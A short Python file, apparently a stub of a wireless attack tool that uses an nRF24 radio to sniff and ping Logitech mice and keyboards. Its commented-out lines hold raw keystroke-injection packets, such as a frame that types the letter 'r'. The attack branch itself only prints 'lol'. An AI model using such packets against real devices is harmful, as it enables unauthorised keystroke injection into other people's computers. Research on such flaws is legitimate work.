from __future__ import print_function, absolute_import
import time
from lib import nrf24


def ping_channel(radio, channels):
    ping = [0x0f, 0x0f, 0x0f, 0x0f]
    for channel in channels:
        radio.set_channel(channel)
        if radio.transmit_payload(ping):
            break


# Logitech mouse or keyboard - this need to be modified !!!
def attacker(address, radio, channels, attack_id):
    radio.enter_sniffer_mode(address.tolist())
    ping_channel(radio, channels)
    if attack_id == 1:
        print("lol")


    # radio.transmit_payload([0, 193, 0, 21, 0, 0, 0, 0, 0, 42])  # r letter - for testing purpose
    # radio.transmit_payload([0, 193, 0, 0, 0, 0, 0, 0, 0, 63])  # avoid loop - for testing purpose
    # list = {
    #     'r': [0, 193, 0, 21, 0, 0, 0, 0, 0, 42],
    #     'wait': [0, 193, 0, 0, 0, 0, 0, 0, 0, 63],
    # }
    # radio.transmit_payload(list['r'])
    # send_packets("lol")